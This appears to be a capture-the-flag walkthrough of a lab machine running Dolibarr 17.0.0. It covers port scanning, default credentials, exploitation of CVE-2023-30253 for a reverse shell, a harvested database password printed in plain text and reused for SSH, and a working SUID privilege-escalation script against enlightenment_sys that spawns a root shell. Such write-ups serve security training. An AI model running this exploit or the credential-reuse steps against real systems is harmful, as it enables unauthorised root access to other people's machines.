### NMAP

```bash
nmap -p- --min-rate=10000 10.10.11.11

PORT   STATE SERVICE

22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -p22,80 -sVC 10.10.11.11

PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80

FOUND DOAMIN board.htb

<img width="1558" height="599" alt="image" src="https://github.com/user-attachments/assets/09a0053f-56a0-4d1f-bf05-9a4636b2c466" />

<img width="1323" height="693" alt="image" src="https://github.com/user-attachments/assets/21b0c5d8-68b9-49b8-bc64-1dfeeb99c656" />


Tried username and password admin admin

<img width="1881" height="488" alt="image" src="https://github.com/user-attachments/assets/b8ae0728-77a4-4ec1-8a4a-6bb574d9df16" />


SEARCH FOR dolibar 17.0.0 exploit and got CVE-2023-30253

Exploited it and got the reverse shell 

<img width="1718" height="759" alt="image" src="https://github.com/user-attachments/assets/50bdb63d-0fe6-429e-95aa-17fa0259321f" />


Searched for config files and got mysql password

<img width="954" height="504" alt="image" src="https://github.com/user-attachments/assets/129c1977-893f-41aa-8852-b64ff96c3ee7" />


Tried this password and got ssh into the machine

<img width="1056" height="160" alt="image" src="https://github.com/user-attachments/assets/0002e17d-5a5b-40a2-8046-4e09e86757c8" />


serverfun2$2023!!

# PRIV ESC

FINDING SOME DIRECTORIES WITH SUID PERMS

```bash
find / -perm -4000 2>/dev/null 
```

<img width="1161" height="509" alt="image" src="https://github.com/user-attachments/assets/994a967b-d1a9-4fe7-92e0-5c9e4c34221b" />


NOW LOOKING AT THE enlightmen_sys binary

THERE IS A PRIV ESC EPXLOIT OF THIS BINARY

```bash
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)

mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

THIS WILL POP A ROOT SHELL

<img width="1864" height="273" alt="image" src="https://github.com/user-attachments/assets/bb08f1d8-f688-4a03-9e28-d556fb5c09f0" />
